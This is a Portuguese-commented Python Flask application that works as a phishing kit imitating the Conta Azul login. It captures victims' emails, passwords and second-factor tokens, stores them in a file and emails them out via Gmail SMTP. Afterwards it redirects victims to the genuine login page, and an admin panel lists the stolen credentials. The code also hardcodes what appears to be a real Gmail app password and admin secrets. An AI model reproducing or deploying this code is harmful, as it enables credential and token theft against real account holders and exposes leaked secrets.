from flask import Flask, render_template, request, redirect, url_for, session
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
import os

# --- Configurações (antes eram no config.py) ---
ENVIAR_EMAIL = True

EMAIL_DESTINO = os.environ.get("EMAIL_DESTINO", "anjonegro.rp2022@gmail.com")
SENDER_EMAIL = os.environ.get("SENDER_EMAIL", "anjonegro.rp2022@gmail.com")
SENDER_PASSWORD = os.environ.get("SENDER_PASSWORD", "ekarwcyybfsbvigo")  # senha de app Gmail

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "RumoAoFuturo")
SECRET_KEY = os.environ.get("SECRET_KEY", "AnjoNegro")

TOKEN_REDIRECT_TYPE = "external"  # "external" ou "internal"
TOKEN_REDIRECT_URL = "https://mais.contaazul.com/#/login"
TOKEN_REDIRECT_ROUTE = "pagina_final"  # rota interna válida se usar "internal"

# --- Aplicação Flask ---
app = Flask(__name__)
app.secret_key = SECRET_KEY

DATA_FILE = os.path.join(os.path.dirname(__file__), "data.txt")

def salvar_dados(info):
    try:
        with open(DATA_FILE, "a", encoding="utf-8") as f:
            f.write(info + "\n")
    except Exception as e:
        print("Erro ao salvar dados:", e)

def enviar_email(mensagem):
    if not ENVIAR_EMAIL:
        print("ENVIAR_EMAIL=False -> não enviando email.")
        return

    if not (SENDER_EMAIL and SENDER_PASSWORD and EMAIL_DESTINO):
        print("Configuração de e-mail incompleta (SENDER_EMAIL/SENDER_PASSWORD/EMAIL_DESTINO).")
        return

    try:
        msg = MIMEText(mensagem)
        msg["Subject"] = "Nova Captura"
        msg["From"] = SENDER_EMAIL
        msg["To"] = EMAIL_DESTINO

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.send_message(msg)
            print("Email enviado com sucesso.")
    except Exception as e:
        print("Erro ao enviar e-mail:", e)

def enviar_email_login_admin(ip):
    mensagem = f"Alerta: Painel Admin acessado em {datetime.now()}\nIP do acesso: {ip}"
    enviar_email(mensagem)

# ---------- Rotas ----------

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        usuario = request.form.get("usuario", "").strip().lower()
        email = request.form.get("email", "").strip()
        senha = request.form.get("senha", "").strip()

        if usuario == "admin" and senha == ADMIN_PASSWORD:
            session["logado_admin"] = True
            ip = request.remote_addr or "IP não disponível"
            enviar_email_login_admin(ip)
            return redirect(url_for("painel"))

        if not email or not senha:
            return render_template("login.html", erro="Preencha e-mail e senha.")

        dados = f"{datetime.now()} | E-mail: {email} | Senha: {senha}"
        salvar_dados(dados)
        enviar_email(dados)
        return redirect(url_for("token"))

    return render_template("login.html")

@app.route("/token", methods=["GET", "POST"])
def token():
    if request.method == "POST":
        token_valor = request.form.get("token")
        dados = f"{datetime.now()} | Token: {token_valor}"
        salvar_dados(dados)
        enviar_email(dados)

        if TOKEN_REDIRECT_TYPE.lower() == "external":
            return redirect(TOKEN_REDIRECT_URL)
        elif TOKEN_REDIRECT_TYPE.lower() == "internal":
            return redirect(url_for(TOKEN_REDIRECT_ROUTE))

        return render_template("dados_enviados.html", mensagem="Dados enviados com sucesso (simulação).")

    return render_template("token.html")

@app.route("/painel", methods=["GET", "POST"])
def painel():
    if not session.get("logado_admin"):
        if request.method == "POST":
            senha = request.form.get("senha")
            if senha == ADMIN_PASSWORD:
                session["logado_admin"] = True
                ip = request.remote_addr or "IP não disponível"
                enviar_email_login_admin(ip)
                return redirect(url_for("painel"))
            else:
                return render_template("login.html", admin=True, erro="Senha incorreta.")
        return render_template("login.html", admin=True)

    if request.method == "POST" and "limpar" in request.form:
        try:
            open(DATA_FILE, "w", encoding="utf-8").close()
            print("Arquivo de dados limpo com sucesso.")
        except Exception as e:
            print("Erro ao limpar dados:", e)
        return redirect(url_for("painel"))

    lista_capturas = []
    tokens_nao_associados = []

    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            linhas = [linha.strip() for linha in f if linha.strip()]

        for linha in linhas:
            try:
                if "| Token:" in linha:
                    partes = linha.split("|")
                    data_hora_token = partes[0].strip()
                    token = partes[1].split(":", 1)[1].strip()
                    for cap in reversed(lista_capturas):
                        if "token" not in cap:
                            cap["token"] = token
                            cap["token_data_hora"] = data_hora_token
                            break
                    else:
                        tokens_nao_associados.append({"token": token, "data_hora": data_hora_token})
                else:
                    partes = linha.split("|")
                    data_hora = partes[0].strip()
                    email = partes[1].split(":", 1)[1].strip()
                    senha = partes[2].split(":", 1)[1].strip()
                    lista_capturas.append({"email": email, "senha": senha, "data_hora": data_hora})
            except Exception as e:
                print("Erro ao processar linha:", linha, e)

    total_capturas = len(lista_capturas)

    acessos = []
    for cap in lista_capturas:
        token = cap.get("token", "—")
        data_hora = cap.get("data_hora", "")
        acessos.append([cap["email"], cap["senha"], token, data_hora])

    return render_template("painel.html", acessos=acessos, total_capturas=total_capturas)

@app.route("/pagina-final")
def pagina_final():
    return render_template("pagina_final.html")

@app.route("/login-externo")
def login_externo():
    return redirect("https://mais.contaazul.com/#/login")

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

if __name__ == "__main__":
    app.run(debug=True)
